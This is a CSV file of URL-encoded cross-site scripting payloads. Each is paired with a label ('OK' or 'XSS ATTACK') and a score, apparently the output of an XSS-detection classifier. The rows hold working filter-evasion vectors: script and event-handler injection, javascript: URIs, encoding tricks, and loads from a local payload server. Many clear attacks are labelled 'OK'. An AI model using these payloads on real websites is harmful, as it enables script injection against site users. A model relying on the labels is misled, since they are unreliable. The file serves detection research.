sentence,result,threshold
%3C/ScrIpt%3E%3CScRIPt%3Eprompt%281%29%3C/ScRIPt%3E,OK,0.311473221
%3Cvideo%20onerror%3D%22alert%281%29%22%3E%3Csource%3E%3C/source%3E%3C/video%3E%3C/div%3E,OK,0.00345483422
%26%27%22%3EPHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4,XSS ATTACK,0.986834824
%3Cbr%3E%3Cbr%3E%3Cb%3E%3Cu%3EX%3C/u%3E%3C/b%3E,OK,0.0474734902
%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%27%29%3B%3E,OK,0.00703057647
%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx27onerror%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.99230814
%27%3E%3CSPAN%20DATASRC%3D%22%23X%22%20DATAFLD%3D%22B%22%20DATAFORMATAS%3D%22HTML%22%3E%3C/SPAN%3E,XSS ATTACK,0.731998324
%22%3E%3Cimg%5B%250d%5Donerror%3Dalert%281%29%20src%3Da%3E,XSS ATTACK,0.47124663
ABC%3Cdiv%20style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,OK,0.0262291729
%27%3E%3Cobject/data%3D//127.0.0.1%3A3555/xss_serve_payloads/flash.swf,XSS ATTACK,0.638380647
%22%3E%3Cimg%20src%5Cx11%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00263932347
%27%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.660711765
document%5B%28%7B%7D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%28%7B%7D%2B%5B%5D%29%5B%2B%21%21%5B%5D%5D%2B%22kie%22%5D,OK,0.0033582747
%22%3E%3Ca%20href%3D%22%5Cx07javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0290520787
%27%3E%3Cscript/src%3D%26%23100%26%2397%26%23116%26%2397%3Atext/%26%23x6a%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x000070%26%23x074%2C%26%23x0061%3B%26%23x06c%3B%26%23x0065%3B%26%23x00000072%3B%26%23x00074%3B%281%29%3E%3C/script%3E,OK,0.000581532717
%3Cinput%20onblur%3Dfocus%28%29%20autofocus%3E%3Cinput%3E,OK,0.0565363765
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%22%3E%3Cbody%20oninput%3Dalert%281%29%3E%3Cinput%20autofocus%3E,XSS ATTACK,0.452300072
%3Cimg%5B%250d%5Donerror%3Dalert%281%29%20src%3Da%3E,XSS ATTACK,0.483420491
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,OK,0.0257362723
%27%3E%3CIMG%20SRC%3D%22javascript%3Aalert%28%27X%27%29%3B%22%3E,XSS ATTACK,0.953920484
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%3F%3Balert%28String.fromCharCode%2875%2C67%2C70%29%29%3B%3F,OK,0.0236082375
%22%3E%3C%3Fxml-stylesheet%20type%3D%22text/css%22%3F%3E%3Croot%20style%3D%22x%3Aexpression%28alert%281%29%29%22/%3E,OK,0.05676952
%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E,XSS ATTACK,0.993190229
%3Ccomment%3E%3Cimg%20src%3D%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29%29//%22%3E,XSS ATTACK,0.604091287
%3Cimg%20src%5Cx32%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00739768147
%22%3E%3CSCRIPT%20a%3D%22%3E%22%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.985703826
%3C/ScrIpt%3E%3Cscript%3Eif%28%22x%5C%22.length%3D%3D2%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,OK,0.0133352578
%22%3E%3CSCRIPT%20SRC%3D%22%25%28jpg%29s%22%3E%3C/SCRIPT%3E,XSS ATTACK,0.982619286
%22%3E%3Ca%20href%3D%22invalid%3A1%22%20id%3Dx%20name%3Dy%3EX%3C/a%3E%3Ca%20href%3D%22invalid%3A2%22%20id%3Dx%20name%3Dy%3EX%3C/a%3E%3Cscript%3Ealert%28x.y%5B0%5D%29%3C/script%3E,OK,0.00751337409
%27%3E%3Ciframe%20name%3Dx%3E%3C/iframe%3E%22%3E%3C/iframe%3E%3Ca%20href%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%22%20target%3Dx%20id%3Dx%3E%3C/a%3E%3Cscript%3Ewindow.onload%3Dfunction%28%29%7Bx.click%28%29%7D%3C/script%3E,OK,0.000328928232
%22%3E%3C%21--%3Cvalue%3E%3C%21%5BCDATA%5B%3CXML%20ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG%20SRC%3D%22javas%3C%21%5BCDATA%5Bcript%3Aalert%281%29%3B%22%3E,OK,0.128558308
%27%3E%3CIMG%20SRC%3D%22javascript%3Aalert%281%29%3B%22,XSS ATTACK,0.917297244
%22%3E%3Csvg%3E%3Cstyle%3E%26lt%3Bimg/src%3Dx%20onerror%3Dalert%281%29//%20%3C/b%3E,OK,0.00342017412
%3Cinput%20value%3D%3C%3E%3Ciframe/src%3Djavascript%3Aconfirm%281%29,OK,0.0192514062
%27%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.203664541
%3Cscript%3Ealert%25281%2529%3C/script%3E,XSS ATTACK,0.921624064
%22%3Beval%28unescape%28location%29%29//%23%250Aalert%281%29,OK,0.0566082
%22%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Djavascript%3Aalert%281%29%3B%22%3E,OK,0.208148
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%3Cbody%20onscroll%3Dprompt%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.15518108
%3Cscript%3Eeval%28%3Fal%3F%2B%3Fert%281%29%3F%29%3B%3C/script%3E,XSS ATTACK,0.986645818
%27%3E%3CSTYLE%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX,XSS ATTACK,0.999135137
%22%3E%3Ciframe/%5C/src%3DjAva%26Tab%3Bscript%3Aalert%281%29%3E,XSS ATTACK,0.979096115
%22%3E%3Cframeset%20onBlur%20frameset%20onBlur%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/frameset%20onBlur%3E,XSS ATTACK,0.979879737
%3C%3Cli%20style%3Dlist-style%3Aurl%28%29%20onerror%3Dalert%281%29%3E%3C/li%3E,OK,0.0029656291
%22%3E%3CX%20STYLE%3D%22X%3Aexpression%28alert%28%27X%27%29%29%22%3E,XSS ATTACK,0.959046245
%3Cimg%20src%3D%20%22a%22%20onerror%3D%20%27eval%28atob%28%22cHJvbXB0KDEpOw%3D%3D%22%29%29%27,OK,0.00159329176
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%27%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.441379488
%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%3E,OK,0.0198352933
%27%3E%3Ca%20onmouseover%3D%22javascript%3Awindow.onerror%3Dalert%3Bthrow%201%3E,OK,0.0317142606
%3C/ScrIpt%3E%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,OK,0.00528752804
%22%3E%3Cbody%20oninput%3Dalert%281%29%3E%3Cinput%20autofocus%3E%3Cdiv%20id%3D%221%22%3E%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E,XSS ATTACK,0.819140553
%3Csvg%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.0557772517
%3Ca%20onmouseover%3D%22javascript%3Awindow.onerror%3Dalert%3Bthrow%201%3E,OK,0.195176542
%3Cbody%20onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cinput%20autofocus%3E,OK,0.00206109881
%22%3E%3Cvideo%3E%3Csource%20onerror%3D%22prompt%281%29%22%3E,OK,0.364234954
%22%3E%3CBODY%20onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Dalert%28%22X%22%29%3E,XSS ATTACK,0.731238
%27%3E%3Cscript%20type%3D%22text/javascript%22%3Ealert%281%29%3B%3C/script%3E,OK,0.375707
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E0,OK,0.247390568
%22%3E%3Cbody%20onFocus%20body%20onFocus%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onFocus%3E,XSS ATTACK,0.688380957
%22%3E%3Cvideo%3E%3Csource%20o%3FUTF-8%3FQ%3Fn%3Ferror%3D%22alert%281%29%22%3E,OK,0.0404306352
%3CINPUT%20TYPE%3D%22IMAGE%22%20SRC%3D%22javascript%3Aalert%281%29%3B%22%3E,OK,0.154270887
%3CScRIPt%3CaLeRT%28String.fromCharCode%2875%2C67%2C70%29%29%3C/ScRIPt%3E,XSS ATTACK,0.9912889
%22%3E%3CIMG%20SRC%3D%60javascript%3Aalert%28%22Kerala%20Cyber%20Force%2C%20%27X%27%22%29%60%3E,OK,0.26169771
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%3Cscript%20src%3D%22%23%22%3E%7Balert%281%29%7D%3C/script%3E%3B1,OK,0.182614833
%22%3E%3C%3CSCRIPT%3Ealert%281%29%3B/,XSS ATTACK,0.978125751
%27%3E%3Cvideo/onprogress%3Dalert%281%29%3E%3Csource/src%3Dx%3E,OK,0.333409965
%27%3E%3C%21%20foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.154913187
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3F/%3E%3Cmarquee%20onfinish%3Dconfirm%281%29%3Ea%3C/marquee%3E,XSS ATTACK,0.952135324
%27%3E%3Ctitle%20onpropertychange%3Dalert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E%3C/title%3E,OK,0.00344589353
%22%3E%3Capplet%20code%3D%22javascript%3Aconfirm%281%29%3B%22%3E,XSS ATTACK,0.79787904
1%3Balert%28/XSS/%29%3B,OK,0.253864318
1%3Balert%28/XSS/%29%3B,OK,0.253864318
%27%3E%3Cscript%20type%3Dtext/javascript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.748918414
%3C/ScrIpt%3E%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C%20function%28%29%7Balert%281%29%7D%29%2Cx%3C/script%3E,OK,0.0154432356
%22%3E%3CIMG%20LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,XSS ATTACK,0.975079894
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%22%3E%3C%21--%5Bif%20gte%20IE%204%5D%3E%3CSCRIPT%3Ealert%281%29%3B%3C/SCRIPT%3E,XSS ATTACK,0.981633186
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29/X/%27%3C/script%3E,OK,0.170864344
X%2520%253Cscript%253Ealert%281%29%253B%253C%252Fscript%253E,XSS ATTACK,0.462878525
%22%3E%3CBGSOUND%20SRC%3D%22javascript%3Aalert%28%27X%27%29%3B%22%3E,XSS ATTACK,0.998758376
%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3B%3E,OK,0.0168749988
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%22%3E%3Cscript%3E%5B%7B%27a%27%3AObject.prototype.__defineSetter__%28%27b%27%2Cfunction%28%29%7Balert%28arguments%5B0%5D%29%7D%29%2C%27b%27%3A%5B%27secret%27%5D%7D%5D%3C/script%3E,OK,0.0252097845
%27%3E%3Cinput%20onActivate%3Dalert%281%29%20autofocus%3E,OK,0.245856315
javascript%3Aalert%281%29%3B,XSS ATTACK,0.939312935
%22%3E%3Ciframe/onload%3Daction%3D/confir/.source%2B%27m%27%3Beval%28action%29%281%29%3E,OK,0.308046311
%27%3E%3Cform%20id%3Dtest%20/%3E%3Cbutton%20form%3Dtest%20formaction%3Djavascript%3Aalert%281%29%3E,OK,0.00288626552
%27%3E%3Cscript%3E/%2A%40cc_on%20alert%281%29%20%40%2A/%3C/script%3E,OK,0.280685961
%3C/ScrIpt%3E%3Cscript%3Eif%28%22x%5C%5CxEE%5CxA9%5Cx93%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,OK,0.0612455606
%22%3E%3Cbody%20onpageshow%3Dalert%281%29%3E,XSS ATTACK,0.527455866
%3Cscript%20%7E%7E%7E%3Ealert%280%250%29%3C/script%20%7E%7E%7E%3E,XSS ATTACK,0.955280602
%27%3E%3Cscript%20src%3D%22javascript%3Aalert%281%29%22%3E,XSS ATTACK,0.779030085
%3Cimg%20src%3Da%20onerror%3Dalert%281%29,OK,0.032648623
%22%3E%3Cstyle%3E%3C/style%5Cx0A%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,OK,0.00640717149
%27%3E%3Cscript%20crossorigin%3Ealert%281%29%3B%3C/script%3E,OK,0.146357477
%27%3E%3Chtml%20onmousemove%20html%20onmousemove%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onmousemove%3E,OK,0.00252071023
%22%3E%3Cscript%5Cx0Dtype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,OK,0.067812115
%22%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx87javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0147036612
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%3C/ScrIpt%3E%3Cscript%3E%20document.cookie%3D%27X%27%3B%20if%28document.cookie%20%21%3D%3D%20%27X%27%29%20%7B%20alert%281%2Cdocument.cookie%29%3B%20%7D%20%3C/script%3E,OK,0.0029040277
ABC%3Cdiv%20style%3D%22x%3A%5Cx0Bexpression%28javascript%3Aalert%281%29%22%3EDEF,OK,0.0107616484
%3C/SCRIPT%3E%3F%3E%3CSCRIPT%3Eprompt%281%29%3C/SCRIPT%3E,XSS ATTACK,0.990011692
%22%3E%3Cscript%20src%3D%22javascript%3Aalert%281%29%22%3E%3C/script%3E,XSS ATTACK,0.613663316
%27%3E%3Cdiv/style%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C/div%3E%20%7BIE7%7D,XSS ATTACK,0.72359854
%27%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.478938371
%3CIMG%20SRC%3Djavascript%3Ajavascript%3Aalert%281%29%3E,OK,0.136749774
%27%3E%3Cimg%20src%3D%23%20onerror%3D%22alert%281%29%22%20%3E,OK,0.0105987191
%3Cimg%20src%3D%22livescript%3Aalert%281%29%3B%22%3E,OK,0.0120966733
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%22%3E%3CDIV%20STYLE%3D%22background-image%3A%20url%28%26%231%3Bjavascript%3Aalert%28%27X%27%29%29%22%3E,XSS ATTACK,0.72956872
%22%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.294095278
JaVaScRipT%3Aalert%281%29,XSS ATTACK,0.518745422
%22%3E%3Cscript%3Ealert%281%29%3C%21--%20%27%3C/script%3E,OK,0.206381947
%3C/ScrIpt%3E%3Cscript%3Ehistory.pushState%280%2C0%2C%27/i/am/somewhere_else%27%29%3B%3C/script%3E,OK,0.0058695972
%3Cisindex%20action%3D%22javas%26Tab%3Bcript%3Aalert%281%29%22%20type%3Dimage%3E,XSS ATTACK,0.69607
%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,XSS ATTACK,0.917498469
%3Cimg%20src%5Cx13%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00741094351
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3Cmarquee/onstart%3Dconfirm%281%29%3E,XSS ATTACK,0.984457254
%22%3E%3Ca%20href%3D%22javas%5Cx07cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0891204178
this%5B%27EvAL%27.toLowerCase%28%29%5D%28%27aLErT%281%29%27.toLowerCase%28%29%29,OK,0.0115641057
%22%27%60%3E%3Cp%3E%3Csvg%3E%3Cscript%3Ea%3D%27hello%5Cx27%3Bjavascript%3Aalert%281%29//%27%3B%3C/script%3E%3C/p%3E,XSS ATTACK,0.836119294
%3C/ScrIpt%3E%3Cscript%3Eeval%28atob%28%3FamF2YXNjcmlwdDphbGVydCgxKQ%3F%29%29%3B%3C/script%3E,OK,0.010774374
%22%3E%3Cbody%20onPageHide%20body%20onPageHide%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onPageHide%3E,OK,0.0657025576
%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.959859848
%27%3E%3Cscri%2500pt%3Ealert%281%29%3B%3C/scri%2500pt%3E,XSS ATTACK,0.774069726
%27%3E%3C/script%3E%3Cimg%20%27//%22%250Aonerror%3Dalert%281%29//%20src%3E,OK,0.3835195
javascript%3Aalert%281%29%27%3Ea%3C/a%3E,XSS ATTACK,0.972170115
%27%3E%3Ca%20href%3D%22%5Cx0Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0256921947
%29%3Balert%281%29//,OK,0.0681188107
%3Cselect%20onfocus%3Djavascript%3Aalert%281%29%20autofocus%3E,XSS ATTACK,0.987886429
%27%3E%3Cdiv%20id%3D%22alert%28%27/X/%27%29%22%20style%3D%22x%3Aexpression%28eval%29%28id%29%22%3E,OK,0.00181469321
%27%3E%3Cimg%20src%3Da%20onerror%3Dalert%281%29,OK,0.0312362313
%3F%3Balert%28%3FX%3F%29,OK,0.0876402855
%3Ciframe%20src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C/iframe%3E,OK,0.000357478857
%22%3E%3Ctextarea%20onfocus%3Djavascript%3Aalert%281%29%20autofocus%3E,XSS ATTACK,0.826429248
%27%3E%3Cvideo%20src%3D1%20onerror%3Dalert%281%29%3E,XSS ATTACK,0.925932288
%22/alert%281%29/%22,OK,0.0551875234
%26%2334%3B%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.996650338
%27%3E%3Cscript%20language%3Dvbs%3EMsgBox%201%3C/script%3E,XSS ATTACK,0.541375935
%27%3E%3Cimg%5Cx32src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0181041062
%22%3E%3Ciframe%20onload%20iframe%20onload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20onload%3E,XSS ATTACK,0.477433801
%27%3E%3Cimg%20src%3Dx%20onerror%3D%5Cx10%22javascript%3Aalert%281%29%22%3E,OK,0.00240775943
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3Cstyle%3E%3C/style%5Cx09%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,OK,0.00639343262
%27%3E%3Ctable%20background%3D%22javascript%3Aalert%281%29%22%3E%3C/table%3E,OK,0.0273723304
%3Cform%20action%3D%27java%26Tab%3Bscri%26Tab%3Bpt%3Aalert%281%29%27%3E%3Cbutton%3ECLICK,OK,0.00697553158
%3Cimg%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0240786672
%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert%281%29%3C/SCRIPT%3E%22%3E,XSS ATTACK,0.983718216
%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%26%23039%3B1%26%23039%3B%29%3E,OK,0.00456407666
%27%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%5Cx00/script%3E,OK,0.348771214
%22%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3Burl%3Ddata%3Aimage/svg%2Bxml%3B%20base64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,OK,0.12803483
%27%3E%3Cdiv%20style%3D%22background%3Aurl%28/f%23%26%23127%3Boo/%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX,OK,0.000764936209
%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E,OK,0.00238543749
%27%3E%3Cscript%3Ealert%281%2C1%3C/script//%29%3C/script%3E,OK,0.196310163
%3Cembed%20src%3D%22data%3Atext/html%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E%3C/embed%3E,OK,0.00600999594
%27%3E%3Csvg%20onResize%20svg%20onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onResize%3E,OK,0.00620099902
%26lt%3BSTYLE%20TYPE%3D%22text/javascript%22%26gt%3Balert%281%29%3B%26lt%3B/STYLE%26gt%3B,OK,0.337699026
%27%3E%3Cscript%3Eif%28%22x%5C%5CxE0%5CxB9%5Cx92%22.length%3D%3D2%29%20%7B%20javascript%3Aalert%281%29%3B%7D%3C/script%3E,OK,0.113439441
